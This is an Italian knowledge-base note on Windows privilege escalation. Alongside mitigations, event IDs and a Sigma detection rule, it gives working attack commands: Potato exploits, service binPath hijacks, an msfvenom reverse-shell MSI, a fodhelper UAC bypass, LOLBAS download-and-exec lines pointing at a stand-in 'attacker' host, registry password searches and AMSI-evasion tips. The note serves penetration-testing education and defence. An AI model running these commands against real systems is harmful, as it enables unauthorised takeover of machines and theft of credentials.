---
tipo: concetto
tag: [windows]
fase: 2
fonti: 6
aggiornato: 2026-06-21
stato: maturo
aliases: ["Privilege Escalation Windows"]

---

# Privilege Escalation Windows

> Nota etica: tecniche di privilege escalation spiegate a scopo difensivo ed educativo. Applicare solo in ambienti lab autorizzati con esplicito permesso scritto.

## In breve

La Privilege Escalation (PrivEsc) su Windows è l'insieme delle tecniche usate da un attaccante per passare da un account a bassi privilegi (es. utente standard) a un account con privilegi elevati (es. `SYSTEM`, `Administrator`, Domain Admin). È una fase critica nella catena di attacco dopo l'accesso iniziale.

## Come funziona

Esistono due categorie principali:

**Verticale**: da utente normale a SYSTEM/Administrator (il caso più comune).
**Orizzontale**: da un account a un altro dello stesso livello ma con accesso a risorse diverse.

Vettori comuni su Windows:

- **Servizi con permessi errati**: un servizio che gira come SYSTEM ma il cui eseguibile è scrivibile da utenti normali. Sostituendo l'eseguibile si ottiene esecuzione come SYSTEM.
- **Scheduled Tasks mal configurate**: task pianificate che eseguono script scrivibili da utenti standard.
- **AlwaysInstallElevated**: policy che permette a qualsiasi utente di installare MSI con privilegi SYSTEM.
- **Token Impersonation**: sfruttare privilegi come `SeImpersonatePrivilege` (tipico degli account di servizio) con tool come Juicy/Rotten Potato.
- **DLL Hijacking**: inserire una DLL malevola in un percorso cercato da un processo privilegiato.
- **Credenziali salvate**: password in chiaro nel registro, file di configurazione, o in output di `cmdkey /list`.
- **Kernel Exploits**: vulnerabilità del kernel Windows (es. EternalBlue, PrintNightmare).

## Esempio pratico

Controllare servizi con permessi deboli su binari:

```powershell
# Cercare servizi il cui eseguibile è scrivibile dal gruppo Users
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq 'Auto'} |
  ForEach-Object {
    $path = $_.PathName -replace '"',''
    if (Test-Path $path) {
      $acl = Get-Acl $path
      $acl.Access | Where-Object {
        $_.IdentityReference -match 'Users|Everyone' -and
        $_.FileSystemRights -match 'Write|FullControl'
      }
    }
  }
```

Tool automatici comuni: **WinPEAS**, **PowerUp** (parte di PowerSploit).

## Mitigazione e difesa

- Applicare il **principio del minimo privilegio**: nessun utente dovrebbe avere più permessi del necessario.
- Controllare regolarmente i permessi di file e cartelle con servizi (`sc.exe qc <nome>` + `icacls`).
- Disabilitare `AlwaysInstallElevated` via Group Policy.
- Applicare patch regolarmente per chiudere vulnerabilità del kernel.
- Usare [[Windows Event Log]] per monitorare creazione di nuovi servizi (Event ID 7045) e modifiche a scheduled tasks (Event ID 4698).
- Abilitare **Windows Defender Credential Guard** e **Attack Surface Reduction** rules.

---

# Approfondimento operativo

## Meccanismo interno — perché esiste la privesc su Windows
- **Integrity levels**: ogni processo ha un livello di integrità (Low < Medium < High < System). Un utente standard gira **Medium**; un admin "elevato" gira **High**; i servizi critici **System**. La privesc verticale = saltare da Medium a High/System. L'**UAC** è la barriera Medium→High *dentro lo stesso utente admin*.
- **Token e privilegi**: l'access token di un processo porta i SID dei gruppi e una lista di **privilegi** (`whoami /priv`). Alcuni privilegi sono "from-here-to-SYSTEM": `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`. Riconoscere questi nella prima riga di output è metà del lavoro.
- **Service Control Manager**: i servizi sono definiti in `HKLM\SYSTEM\CurrentControlSet\Services`. Girano spesso come `LocalSystem`. Se puoi modificare il binario, il path o la config di un servizio System, ottieni esecuzione come System al riavvio (o con `sc start`).

```
Integrity:  Low ── Medium ──[UAC]── High ──────── System
Privesc:        ╰── utente std ──╯  ╰─ admin ─╯  ╰─ servizi ─╯
Obiettivo:                     salire fin qui ──────────────►
```

## Checklist operativa per vettore
Per ognuno: **enumera → riconosci se sfruttabile → exploit**.

### A. Token impersonation (SeImpersonate / "Potato")
- **Enumera**: `whoami /priv` → cerca `SeImpersonatePrivilege = Enabled`. Tipico di account di servizio (IIS `iis apppool\…`, MSSQL `NT Service\MSSQLSERVER`).
- **Sfruttabile se**: il privilegio è **Enabled** (non solo presente). Versione Windows conta (vedi gotcha sotto).
- **Exploit**:
```cmd
:: Windows 10/Server 2016-2019 → JuicyPotato; 2019+/Win11 → PrintSpoofer o GodPotato
PrintSpoofer.exe -i -c cmd            :: shell come SYSTEM
GodPotato -cmd "cmd /c whoami"        :: alternativa moderna, copre 2012-2022
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```
> [!warning] JuicyPotato è morto su Server 2019+
> Microsoft ha chiuso il trick DCOM/BITS originale. Su Server 2019, Windows 10 1809+ e Win11 usa **PrintSpoofer**, **GodPotato** o **RoguePotato** (richiede un redirector OXID su :135). Scegliere la potato sbagliata = "exploit non funziona" senza motivo apparente.

### B. Servizi — unquoted path
- **Enumera**:
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
- **Sfruttabile se**: il path ha **spazi**, non è tra virgolette, **e** hai permesso di scrittura in una cartella intermedia (es. `C:\Program Files (x86)\My App\service.exe` → puoi scrivere `C:\Program.exe` o `C:\Program Files (x86)\My.exe`).
- **Exploit**: piazzi il tuo payload come `C:\Program Files (x86)\My.exe`, poi `sc stop`/`sc start` o reboot. Windows cerca i path in ordine e lancia il tuo binario come l'account del servizio (System).

### C. Servizi — weak binary/service permissions
- **Enumera**: `accesschk.exe -uwcqv "Users" *` (su servizi) o PowerUp `Get-ModifiableServiceFile` / `Get-ModifiableService`.
- **Sfruttabile se**: il gruppo `Users`/`Authenticated Users` ha `WRITE_DAC`, `SERVICE_CHANGE_CONFIG` o write sul binario.
- **Exploit**:
```cmd
:: riconfigura il binPath del servizio verso il tuo comando
sc config VulnSvc binPath= "C:\temp\rev.exe"
sc stop VulnSvc & sc start VulnSvc
:: oppure, se solo il file è scrivibile, sovrascrivi l'eseguibile
```

### D. AlwaysInstallElevated
- **Enumera**:
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- **Sfruttabile se**: **entrambe** le chiavi (HKCU e HKLM) valgono `0x1`. Solo una = non sfruttabile.
- **Exploit**: qualunque MSI viene installato come System.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=… LPORT=… -f msi -o evil.msi
# sul target:
msiexec /quiet /qn /i C:\temp\evil.msi
```

### E. UAC bypass
- **Enumera**: `whoami /groups` mostra `Mandatory Label\Medium`; sei nel gruppo Administrators ma non elevato. `EnableLUA` in `HKLM\…\System\Policies` confermerà se UAC è attivo.
- **Sfruttabile se**: sei già membro di Administrators, UAC ≠ "Always notify", e c'è un eseguibile **auto-elevate** abusabile.
- **Exploit**: tecniche fileless via hijack di chiavi di registro lette da un binario auto-elevate:
```cmd
:: fodhelper bypass (classico): scrive un comando in HKCU e lancia fodhelper.exe (auto-elevate)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
start fodhelper.exe
```
Tool: **UACMe** (raccolta di decine di metodi indicizzati per build). Non è privesc "da utente a admin": è da **admin-non-elevato a admin-elevato**.

### F. LOLBAS (Living Off the Land Binaries)
- **Enumera**: cerca scenari dove un binario firmato Microsoft fa qualcosa di privilegiato per te (download, exec, bypass AppLocker). Indice: lolbas-project.github.io.
- **Sfruttabile se**: il binario è presente e l'azione (es. `certutil` download, `msbuild` exec di codice C#, `regsvr32` scriptlet remoto) non è bloccata.
- **Esempi**:
```cmd
certutil -urlcache -split -f http://attacker/rev.exe C:\temp\rev.exe   :: download
regsvr32 /s /n /u /i:http://attacker/evil.sct scrobj.dll               :: exec remoto, bypass AppLocker
msbuild.exe evil.xml                                                    :: compila ed esegue C# inline
```
> LOLBAS è più *evasione/exec* che privesc pura, ma è il modo con cui si **lanciano** gli exploit privesc senza droppare tool noti.

### G. Altri vettori rapidi
- **Scheduled task scrivibili**: `schtasks /query /fo LIST /v` → script in path scrivibile.
- **Credenziali salvate**: `cmdkey /list`, `reg query HKLM /f password /t REG_SZ /s`, file `unattend.xml`/`web.config`/`*.kdbx`.
- **DLL hijacking**: ProcMon per trovare DLL cercate e non trovate (`NAME NOT FOUND`) in path scrivibili.
- **Autorun/AutoElevate**: PowerUp `Invoke-AllChecks` copre molti di questi in un colpo.

## Walkthrough end-to-end
```cmd
:: 1. Orientarsi
whoami /priv & whoami /groups & systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
:: 2. Scansione automatica
winPEASany.exe quiet                 :: oppure PowerUp: powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
:: 3. Bivio decisionale:
::    SeImpersonate Enabled?  → ramo A (Potato)  → SYSTEM diretto
::    Servizio modificabile?  → ramo C (sc config) → SYSTEM al restart
::    AlwaysInstallElevated?  → ramo D (msi)      → SYSTEM
:: 4. Eseguito l'exploit, conferma:
whoami                                :: deve restituire: nt authority\system
```
> [!tip] Ordine di preferenza
> 1) `SeImpersonate` (più affidabile e pulito) → 2) servizi weak-perm → 3) AlwaysInstallElevated → 4) kernel exploit (ultima scelta: può causare BSOD).

## Casi limite e varianti
- **Server Core / nessun GUI**: niente fodhelper UI ma i bypass di registro funzionano lo stesso.
- **Windows 11 / Server 2022**: JuicyPotato classico KO; usa GodPotato/PrintSpoofer. Credential Guard può vanificare il furto credenziali post-privesc.
- **Account `iis apppool`**: hanno SeImpersonate ma niente accesso a molte cartelle → Potato è quasi sempre la via.
- **Domain context**: una privesc locale a SYSTEM su una macchina di dominio = accesso all'account computer `MACCHINA$` e agli hash in cache (link a [[Pass-the-Hash]] e movimento laterale).

## Detection engineering
| Evento | Vettore | MITRE |
|---|---|---|
| **7045** nuovo servizio installato | sc config/create per privesc o persistenza | T1543.003 |
| **4697** servizio installato (Security log) | come sopra, fonte alternativa | T1543.003 |
| **4698/4702** scheduled task creato/modificato | task privesc | T1053.005 |
| **4688** con `parent=spoolsv.exe`/`fodhelper.exe` child anomalo | PrintSpoofer / UAC bypass | T1134 / T1548.002 |
| **4673/4674** uso di privilegi sensibili | abuso SeImpersonate/SeDebug | T1134 |
| Sysmon **1** msiexec da path utente | AlwaysInstallElevated | T1548.002 |

Regola Sigma (fodhelper UAC bypass):
```yaml
title: UAC bypass via fodhelper hijack
logsource: { product: windows, category: process_creation }
detection:
  selection:
    ParentImage|endswith: '\fodhelper.exe'
  filter:
    Image|endswith: '\SystemSettingsAdminFlows.exe'   # comportamento legittimo
  condition: selection and not filter
level: high
```

## Evasion / OPSEC (con limiti)
- Preferisci tecniche **fileless** (UAC bypass via registro) a drop di binari noti come WinPEAS (firmato dagli AV). Limite: i bypass di registro lasciano comunque chiavi anomale (Sysmon 13).
- PrintSpoofer è più silenzioso di JuicyPotato (niente CLSID brute-force rumoroso). Limite: genera comunque named pipe sospette (`\\.\pipe\…`).
- Esegui in-memory (`Invoke-…` riflessivo) per evitare l'on-write scan. Limite: AMSI ispeziona PowerShell in memoria → serve bypass AMSI, che è esso stesso rilevabile.

## Troubleshooting — 5 errori da principiante
1. **"JuicyPotato non funziona"** su Server 2019/Win11 → il vettore DCOM è patchato. Causa reale: versione OS. Usa PrintSpoofer/GodPotato.
2. **`accesschk` chiede di accettare la EULA e si blocca** → aggiungi `/accepteula` (o setta la chiave di registro), altrimenti su shell non interattiva resta appeso.
3. **AlwaysInstallElevated "presente" ma l'MSI non eleva** → hai controllato solo HKCU. Serve `0x1` **anche** in HKLM; con una sola chiave non funziona.
4. **`sc config binPath=` fallisce con "accesso negato"** → non hai `SERVICE_CHANGE_CONFIG` su *quel* servizio; PowerUp lo aveva flaggato come "binario scrivibile", che è un vettore diverso (sovrascrivi il file, non riconfiguri).
5. **La reverse shell come SYSTEM muore subito** → il payload girava in un processo che termina (es. il servizio si chiude). Causa: manca la migrazione/`spawnto`. Inietta in un processo stabile o usa un binario che fa fork.

## Domande da colloquio
**D: Hai `SeImpersonatePrivilege`. Spiega perché ti porta a SYSTEM.**
R: Quel privilegio permette di impersonare il token di un client che si connette a te. Le "Potato" forzano un servizio privilegiato (DCOM, spooler) ad autenticarsi verso una pipe/endpoint che controllo; catturo e impersono il suo token, che è di SYSTEM. Da Server 2019 il vettore classico di JuicyPotato è chiuso, quindi uso PrintSpoofer/GodPotato che sfruttano il print spooler / RPC.

**D: Differenza tra unquoted service path e weak service permission?**
R: Unquoted path sfrutta il modo in cui Windows risolve un path con spazi non quotato: pianto un .exe in una cartella intermedia scrivibile. Weak permission sfrutta una DACL larga sul servizio o sul binario: riconfiguro `binPath` o sovrascrivo l'eseguibile. Il primo dipende dalla stringa del path, il secondo dai permessi NTFS/SCM.

**D: UAC è un confine di sicurezza? Perché ha tanti bypass?**
R: Microsoft afferma ufficialmente che **UAC non è un security boundary**: è un convenience prompt per ridurre l'esecuzione admin involontaria. Per questo i bypass (auto-elevate + registry hijack) non sono trattati come vulnerabilità da patchare con urgenza. Vale solo se sei già admin: non trasforma un utente standard in admin.

## Collegamenti

- [[PowerShell]]
- [[Windows Event Log]]
- [[Registro di Sistema Windows]]
- [[Utenti e Permessi Windows]]
- [[Pass-the-Hash]]
- [[Impacket]]
- [[MITRE ATT&CK]]
- [[WinPEAS]]
- [[PowerUp]]
- [[Active Directory]]
- UAC

## Fonti

- HackTricks — Windows Local Privilege Escalation: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- MITRE ATT&CK T1068 — Exploitation for Privilege Escalation: https://attack.mitre.org/techniques/T1068/
- TryHackMe — Windows PrivEsc: https://tryhackme.com/room/windows10privesc
- LOLBAS Project: https://lolbas-project.github.io/
- itm4n — PrintSpoofer / SeImpersonate abuse: https://itm4n.github.io/printspoofer-abusing-impersonation-privileges/
- hfiref0x — UACMe (raccolta UAC bypass): https://github.com/hfiref0x/UACME
